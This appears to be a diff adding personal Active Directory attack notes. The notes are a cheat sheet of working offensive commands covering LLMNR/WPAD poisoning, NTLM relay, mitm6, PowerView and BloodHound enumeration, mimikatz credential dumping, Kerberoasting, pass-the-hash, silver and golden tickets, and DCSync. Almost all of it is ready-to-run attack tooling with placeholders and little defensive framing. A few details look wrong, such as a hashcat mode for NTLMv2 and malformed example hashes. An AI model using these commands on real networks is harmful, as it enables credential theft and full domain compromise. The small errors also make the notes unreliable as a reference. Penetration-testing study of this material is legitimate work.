@@ -1,0 +1,390 @@
+Active Directory Notes By Nikhil Sahoo
+
+// Understand NTLM authentication and Kerberos Authentication in AD first before proceeding.
+
+// All the text with <> needs to be replaced
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+// LLMNR Poisoning
+
+// Used to identify hosts when the DNS fails to do.
+
+// Responder allows you to listen for these events and answer back to whoever made the request, grabbing the username and hash of the user.
+
+responder -I eth0 -rdw
+
+hashcat -m 500 <hashfile> <rockyou.txt>
+
+
+// Attacking WPAD
+
+// Windows is configured to search for a Proxy Auto Config (PAC) file, via the Web Proxy Auto-Discovery (WPAD)
+
+responder -I eth0 --wpad
+
+// SMB Relay instead of cracking
+
+// SMB signing must be disabled
+
+nmap --script=smb2-security-mode.nse -p445 <IP>/<CIDR>  // to detect all targets where smb signing is disabled
+
+Open Responder.conf and set SMB and HTTP to off
+
+responder -I eth0 -rdw
+
+// open another tab
+
+python ntlmrelayx.py -tf <target file> -smb2support
+
+python ntlmrelayx.py -tf <target file> -smb2support -i // for interactive shell
+
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+// DNS Takeover
+
+// IPV6 is prefferd over IPv4 meaning if a machine has an IPv6 DNS server, it will use that over the IPv4
+
+// we leverage the fact that we control DNS with spoofing WPAD answers
+
+mitm6 -d <domain  name>
+
+ntlmrelayx.py -wh <attacker's ip> -t smb://<target Ip>/ -i  // relaying via smb
+
+ntlmrelayx.py -6 ldaps://<target to relay creds> -wh <attacker's Ip> -l lootme  // Relaying via Ldaps
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+net user : enumerate all local accounts
+
+net user /domain : enumerate all users in the entire domain
+
+net user <username> /domain : all information regarding a particular user including it's group membership
+
+net group /domain : all groups in the domain
+
+// Enum using Powerview
+
+powershell -ep bypass
+..\Powerview.ps1
+
+Get-NetDomain  //Enum Domain
+
+Get-NetDomainController  // Enum Domain Controller Eg: Ip address
+
+Get-DomainPolicy
+
+(Get-DomainPolicy)."<policy name>"  // Eg: (Get-DomainPolicy)."Kerberos Policy"
+
+Get-NetUser  // Enum User
+
+Get-UserProperty  // Lists out all the properties
+
+Get UserProperty -Properties <property name>  // Get a list of all users along with the specified property. Eg: Get UserProperty -Properties pwdlastset
+
+Get-NetUser | select <property name>  // Eg: Get-NetUser | select description
+
+Get-NetComputer -FullData  // Enum computers...Filter using select as per needs
+
+Get-NetGroup  //Enum Groups...Eg: Get-NetGroup -GroupName "Domain Admin"
+
+Get-NetGroupMember -GroupName "<group name>"  // Enum group membership
+
+Invoke-ShareFinder  //Enum smb shares
+
+Get-NetGPO  //Enum Group Policies...Filter it using select
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+// Domain mapping in graphical format using BloodHound
+
+apt install bloodhound
+neo4j console
+bloodhound
+
+//Download Sharphound.ps1 and load it
+
+powershell -ep bypass
+..\SharpHound.ps1
+Invoke-BloodHound -CollectionMethod All -Domain <domain name> -ZipFileName <filename>.zip
+
+// Upload data to bloodhound using the upload data tab at the right of the console
+
+// Go to queries and click on all the queries like find all the domain admins, shortest path to dc etc to get a better idea of the domain and the relationship between it's members.
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+// Enumerate all users in the current domain
+
+$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+$PDC = ($domainObj.PdcRoleOwner).Name
+$SearchString = "LDAP://"
+$SearchString += $PDC + "/"
+$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
+$SearchString += $DistinguishedName
+$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
+$objDomain = New-Object System.DirectoryServices.DirectoryEntry
+$Searcher.SearchRoot = $objDomain
+$Searcher.filter="samAccountType=805306368"
+$Searcher.FindAll()
+Foreach($obj in $Result)
+{
+  Foreach($prop in $obj.Properties)
+  {
+     $prop
+  }
+  Write-Host "------------------------"
+}
+
+
+// For quering a particular account, change the filter to the following and also change the loop for better and cleaner output:
+
+$Searcher.filter="name=Jeff_Admin"
+
+Loop:
+
+
+// enumerate aLL groups
+
+$Searcher.filter="(objectClass=Group)"
+
+Loop:
+Foreach($obj in $Result)
+{
+$obj.Properties.name
+}
+
+
+// Enumerate a single group or resolve nested groups
+
+$Searcher.filter="(name=Secret_Group)"
+
+Loop:
+Foreach($obj in $Result)
+{
+$obj.Properties.member
+}
+
+// Enumerating Service Principal Names (SPNs)
+
+// Same as above script just change the filter:
+
+$Searcher.filter="serviceprincipalname=*http*" // This is going to search for web servers .. You could change the spn filter accordingly.
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+// Next we would like to compromise either domain admins, or any other account that will eventually lead us to the domain admin.
+
+// For this we would need to enumerate all users logged on to a target. This could be done using Get-NetLoggedon and Get-NetSession functionality of the powerview script from the powershell empire framework.
+
+// First import powerview module
+
+Import-Module .\PowerView.ps1
+
+// Get-NetLoggedon : Will list out all the users logged on to the system
+
+Get-NetLoggedon -ComputerName <workstation name>
+
+// Get-NetLoggedon : Will list out all the users having active user sessions on the domain controller or file system.
+
+Get-NetSession -ComputerName <domain controller or file server>
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+// Extracting Cached Credentials
+
+// The hashes are stored in the LSASS in order to renew a TGT request
+
+// Make Sure you have admin privileges.
+
+mimikatz.exe
+privilege::debug // enables to interact with a process used by another account.
+sekurlsa::logonpasswords  // This will dump the creds of all the loggedin users
+
+sekurlsa::tickets // Retrieval of TGS and TGT
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+// Kerberosting....Attacking Service Tickets of SPNs
+
+// SPN Enumeration
+
+https://blog.stealthbits.com/discovering-service-accounts-without-using-privileges/   // Refer this SPN enumeration
+
+https://www.saotn.org/list-spns-used-active-directory/  // SPN Listing
+
+usemodule situational_awareness/network/get_spn  // Enumera using Empire
+
+Get-NetUser | Where-Object {$_.servicePrincipalName} | fl  // Included in powerview
+
+GetUserSPNs.py <domain>/<username>:<password> -dc-ip <IP Address of Domain Controller>  -request  // Included in Impacket
+
+get-adobject | Where-Object {$_.serviceprincipalname -ne $null -and $_.distinguishedname -like "*CN=Users*" -and $_.cn -ne "krbtgt"}  // Powershell Inbuilt
+
+
+// Request service tickets from AD using SPN values
+
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList '<Service Principal Name>'
+
+klist  // powershell command to list all the cached kerberos tickets.
+
+kerberos::list /export  // Mimikatz cmd to download the ticket to the disk. The output would result a filename
+
+// We can then crack the ticket using tgsrepcrack.py or john or hashcat
+
+apt install kerberoast
+python tgsrepcrack.py <wordlist> <service ticket file name>
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+// Slow Password Guessing Attacking
+
+Bruteforce user passwords based on the acount lockout policy.. So the target account won't get locked out.
+
+Script: https://github.com/ZilentJack/Spray-Passwords
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+// Pass the Password
+
+Crackmapexec <Network IP Address>/<CIDR> -u <username> -d <domain name> -p <password> 
+
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+// Token Impersonation
+// Metasploit
+
+load icognito
+list_tokens -u  //-g for groups
+impersonate_token <abailable token based on the previous result>
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+// Hash Dumping
+
+secretsdump.py <domain>/<username>:<password>@<IP Address>
+
+hashcat -m 1000 <hash file> <wordlist> -O // Cracking hashes
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+// Pass The Hash
+
+// Hashes could be extracted from the techniques above...Hashes are also dumped using fgdump,pwdump,cachedump,cqhashdump
+
+pth-winexe -U <DOMAIN/user>%<hash> //<ip> cmd
+
+//mimikatz
+privilege::debug
+sekurlsa::pth /user:<username> /domain:<domainname> /ntlm:<here you put NT Hash>
+
+
+//Using Crackmap
+Crackmapexec <Network IP Address>/<CIDR> -u <username> -H <hash> --local  // for attacking local accounts
+
+
+//metasploit module
+msf > use exploit/windows/smb/psexec
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+// Overpass the Hash
+// Here we over abuse the NTLM hash to generate a TGT or service ticket that would eventually give us access to other machines like the domain controller
+
+sekurlsa::pth /user:<username> /domain:<domain name> /ntlm:<hash> /run:PowerShell.exe
+
+//Now we need to generate a TGT by interacting with the target server/machines.. Make sure you type in the below commands in the newly opened powershell.
+net use \\<domain controller> // You could use any command BTW to interact with the target
+
+klist // To confirm if any service tickets have been generated
+
+.\PsExec.exe \\<domain controller> cmd.exe 
+
+// And we should be finally in the target machine
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+// Pass the ticket (Silver Ticket)
+
+// TGT would work only on the machine it was created on unlike TGS which could be exported and reinjected elsewhere. This technique takes the advantage of the TGS
+
+// We discussed before how to crack service accounts and use them.
+
+// If the service account is not a local admin then we won't be able to perform lateral movement like pass the Hash or overpass the hash.
+
+// If we have the service account password or NTLM hash we could forge the service ticket to access the resource with any permission we desire. This forged ticket is called silver ticket.
+
+// To create a silver ticket we need the password hash and not the password, we must hash it before using it to genrate silver ticket
+
+// The following will give the SID.
+// This consists of Domain identifier and relative identifier... We will only need the domain identifier
+// Eg : S-1-5-21-2536614405-3629638762-4218571032-4896 where 4896 is the Relative identifier and S-1-5-21-2536614405-3629638762-4218571032-4896 is the domain id
+
+whoami /user 
+
+kerberos::purge  // To flush any existing tickets.
+
+kerberos::golden /user:<username> /domain:<domain name> /sid:<Only the Domain ID> /target:<Hostname of the service> /service:<Service in use> /rc4:<password hash of the service> /ptt
+
+// Eg : kerberos::golden /user:nikhil /domain:lala.com /sid:S-1-4-91-1502875589-3377523511-2599479668 /target:web.lala.com /service:HTTP /rc4:H2B475C11DA2A0748290L87AA966C327 /ptt
+
+klist  // To verify
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+// Maintaining Persistence ( Golden Tickets )
+
+// KDC encrypt the TGT swith a secret key which is the password hash of the domain user account krbtgt
+
+// Once we get the password hash of the krbtgt we can create our own custom ticket (golden ticket), like stating a lower privilege is a member of the domain admins group.
+
+// We need to have access to any account from the domain admin group or the domain controller itself.
+
+// You can specify any fake user account but it is good to perform this using a valid user account in the AD environment.
+
+// Extraction of pass hash of krbtgt account
+privilege::debug
+lsadump::lsa /patch
+
+// Creation of golden ticket
+kerberos::purge  // To flush any existing tickets.
+kerberos::golden /user:<username> /domain:<domain name> /sid:<Only the Domain ID> /krbtgt:<password hash of krbtgt> /ptt
+// Eg : kerberos::golden /user:anyuser /domain:lala.com /sid:S-1-4-91-1502875589-3377523511-2599479668 /krbtgt:85o68330a2394a812000jkfad8492973 /ptt
+
+misc::cmd  // open a new command prompt
+
+psexec \\<domain controller> cmd.exe  // login to the user specified in the ticket.
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+// Persistence using Domain Controller Synchronisation
+
+// To steal pass hash of the admin users of the domain we could either move to the dc and run mimikatz or we could steal the NTDS.dit, it is similar to SAM database for local accounts.
+
+// However we could abuse another AD functionality
+
+// There might be more than one DC in production. A dc could initiate an update request to another dc using the IDL_DRSGetNCChanges api.
+
+// But the recieving dc does not check if the request came from another dc. It only checks for SID associated has appropriate privileges or not.
+
+lsadump::dcsync /user:Administrator
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+ 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
